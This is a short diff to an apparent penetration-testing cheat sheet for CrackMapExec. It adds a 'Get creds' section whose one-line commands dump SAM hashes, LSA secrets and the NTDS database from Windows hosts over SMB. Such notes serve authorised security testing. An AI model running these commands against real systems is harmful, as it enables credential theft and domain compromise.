@@ -19,6 +19,16 @@ crackmapexec smb 192.168.0.24 -u UserName -p 'password'
 Dump SAM
 crackmapexec smb 192.168.0.24 -u UserName -p 'password' --sam
 
+Get creds
+SAM
+cme smb 10.0.0.0 -u UserName -p 'PASS' --sam`
+
+LSA
+cme smb 10.0.0.0 -u UserName -p 'PASS' --lsa`
+
+NTDS
+cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds #Via RPC`
+
 Get Domain Name
 Domain name retrieved 
 cme smb 192.168.164.x -u '' -p ''
